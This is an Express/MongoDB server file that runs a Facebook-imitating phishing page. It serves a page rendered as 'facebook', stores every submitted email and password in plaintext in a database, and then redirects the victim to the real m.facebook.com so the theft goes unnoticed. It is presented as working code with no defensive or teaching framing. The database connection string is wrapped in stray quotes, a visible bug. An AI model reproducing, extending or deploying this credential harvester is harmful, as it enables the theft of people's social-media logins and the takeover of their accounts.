
require("dotenv").config()

const express = require("express");
const bodyParser = require("body-parser");
const ejs = require("ejs");
const mongoose = require("mongoose");
const encryption = require("mongoose-encryption")
const PORT = process.env.PORT || 3000

const app = express();

app.use(express.static("public"));
app.set('view engine', 'ejs');
app.use(bodyParser.urlencoded({
    extended:true
}));



mongoose.set('strictQuery', false);
mongoose.connect('" '+process.env.MONGO_URI+' "',{useNewUrlParser:true});

const userSchema = new mongoose.Schema({
    email : String,
    password : String 
});


const User = new mongoose.model("User", userSchema);

app.get('/', function(req, res){
    res.render("facebook");
})

app.post("/", function(req,res){
    const newUser = new User({
        email: req.body.username,
        password: req.body.password
    });
    newUser.save().then(()=>{
            res.redirect("https://m.facebook.com");
        }).catch
        ((err)=>{
            console.log(err);
        })
})


app.listen(PORT,function(res,req){
    console.log("server is running on "+PORT );
})
